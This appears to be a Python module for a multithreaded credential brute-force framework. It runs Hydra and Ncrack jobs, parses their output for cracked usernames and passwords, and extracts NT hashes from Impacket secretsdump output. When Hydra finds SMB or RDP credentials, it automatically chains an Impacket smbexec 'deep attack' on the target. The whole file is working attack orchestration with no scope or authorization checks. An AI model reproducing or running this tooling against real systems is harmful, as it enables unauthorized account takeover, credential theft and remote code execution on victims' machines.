import subprocess
import threading
import time
from queue import Queue
from utils import get_creation_flags
import re
from datetime import datetime

class ParallelExecutor:
    def __init__(self, max_threads=5, log_function=None):
        self.max_threads = max_threads
        self.log = log_function
        self.task_queue = Queue()
        self.results = {}
        self.active_threads = 0
        self.lock = threading.Lock()
        self.threads = []
        self._stop_flag = threading.Event()
        self.audit_log = []
        self.session_id = None
    
    def add_task(self, target_id, command, service):
        self.task_queue.put((target_id, command, service))
    
    def worker(self):
        while not self._stop_flag.is_set():
            item = self.task_queue.get()
            if item is None:
                self.task_queue.task_done()
                break
            target_id, command, service = item
            try:
                with self.lock:
                    self.active_threads += 1
                
                if not command:
                    if self.log:
                        self.log("Error", "Empty command received")
                    self.task_queue.task_done()
                    continue
                
                # Identify target for logging
                target = ""
                if isinstance(command, list):
                    for arg in command:
                        if "://" in str(arg):
                            target = str(arg).split('://')[-1]
                            break
                        elif "@" in str(arg):
                            target = str(arg).split("@")[-1]
                            break
                    if not target and len(command) > 0:
                        target = str(command[-1])
                else:
                    target = str(command)
                if self.log:
                    self.log("Info", f"Starting brute-force for {service} on {target}")

                # Execute command with timeout
                creation_flags = get_creation_flags()
                timeout = 600  # 10 minutes per task
                output = ""
                try:
                    result = subprocess.run(
                        command,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        encoding="utf-8",
                        errors="ignore",
                        timeout=timeout,
                        creationflags=creation_flags
                    )
                    output = result.stdout
                except subprocess.TimeoutExpired:
                    if self.log:
                        self.log("Warning", f"Timeout for {service} on {target}")
                except Exception as e:
                    if self.log:
                        self.log("Error", f"Command execution error: {str(e)}")
                
                found_credentials = []
                # Log every attempt, parse success
                if output:
                    for line in output.splitlines():
                        line = line.strip()
                        # Hydra/Ncrack attempt lines
                        if "[ATTEMPT]" in line or "login:" in line:
                            # Try to extract attempted user/pass
                            m = re.search(r'login:\s*"?(\S+)"?\s+password:\s*"?(\S+)"?', line)
                            if m:
                                u, p = m.group(1), m.group(2)
                                if self.log:
                                    self.log("Try", f"Tried {u}:{p} on {target} ({service})")
                        # Impacket/SMBexec may show attempted auth too
                        if "Trying" in line and "@" in line:
                            # Example: Trying user@target
                            if self.log:
                                self.log("Try", line)
                        # Success lines - Hydra/Ncrack
                        if "login:" in line and "password:" in line and ("[SUCCESS]" in line or "success" in line.lower() or "valid" in line.lower()):
                            # Parse credentials
                            try:
                                parts = line.split()
                                login_index = parts.index("login:")
                                password_index = parts.index("password:")
                                username = parts[login_index + 1]
                                password = parts[password_index + 1]
                                cred = f"{username}:{password}"
                                if cred not in found_credentials:
                                    found_credentials.append(cred)
                            except Exception:
                                # fallback
                                m = re.search(r'login:\s*"?(\S+)"?\s+password:\s*"?(\S+)"?', line)
                                if m:
                                    cred = f"{m.group(1)}:{m.group(2)}"
                                    if cred not in found_credentials:
                                        found_credentials.append(cred)
                        # For impacket or custom tools, success is usually explicit
                        if "impacket" in str(command).lower() or "python" in str(command).lower():
                            if "secretsdump" in str(command).lower():
                                # Output: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
                                if ":::" in line and ":" in line:
                                    parts = line.split(":")
                                    if len(parts) >= 5:
                                        username = parts[0]
                                        lm_hash = parts[3]
                                        nt_hash = parts[4]
                                        cred = f"{username}:{lm_hash}:{nt_hash}"
                                        found_credentials.append(cred)
                            elif any(x in str(command).lower() for x in ["smbexec", "wmiexec", "rdp_check"]):
                                if "success" in line.lower() or "authentication successful" in line.lower():
                                    # Try to extract hash
                                    m = re.search(r"with\s+hash\s+([a-f0-9]{32}:[a-f0-9]{32})", line, re.IGNORECASE)
                                    if m:
                                        found_credentials.append(m.group(1))
                                    # Or extract username
                                    else:
                                        m = re.search(r"(\S+@\S+)", line)
                                        if m:
                                            found_credentials.append(m.group(1))
                    
                    # Optionally log full output for debug
                    if self.log and found_credentials:
                        self.log("Debug", output[:1000] + ("..." if len(output) > 1000 else ""))
                
                self.results[target_id] = {
                    "success": bool(found_credentials),
                    "credentials": found_credentials,
                    "service": service
                }
                
                # ✅ Kết hợp Hydra + Impacket
                if "hydra" in str(command).lower() and found_credentials:
                    if "smb" in service.lower() or "rdp" in service.lower():
                        self.log("Info", f"Launching Impacket deep attack on {target}")
                        # Tạo command Impacket (giả định)
                        impacket_cmd = ["python", "-m", "impacket.examples.smbexec", target]
                        self.add_task(f"{target_id}-impacket", impacket_cmd, service)
                
            except Exception as e:
                if self.log:
                    self.log("Error", f"Execution error: {str(e)}")
                self.results[target_id] = {
                    "success": False,
                    "error": str(e),
                    "service": service
                }
            finally:
                with self.lock:
                    self.active_threads -= 1
                self.task_queue.task_done()
                
                # Audit logging
                self.audit_log.append({
                    'timestamp': datetime.now().isoformat(),
                    'target': target,
                    'command': " ".join(command) if isinstance(command, list) else command,
                    'output': output[:500] + ("..." if len(output) > 500 else ""),
                    'success': bool(found_credentials)
                })
    
    def start(self):
        self._stop_flag.clear()
        self.threads = []
        for _ in range(self.max_threads):
            thread = threading.Thread(target=self.worker, daemon=True)
            thread.start()
            self.threads.append(thread)
    
    def wait_completion(self):
        self.task_queue.join()
        # Signal threads to exit
        self.stop()
        for t in self.threads:
            t.join(timeout=1)
        return self.results
    
    def stop(self):
        self._stop_flag.set()
        for _ in range(self.max_threads):
            self.task_queue.put(None)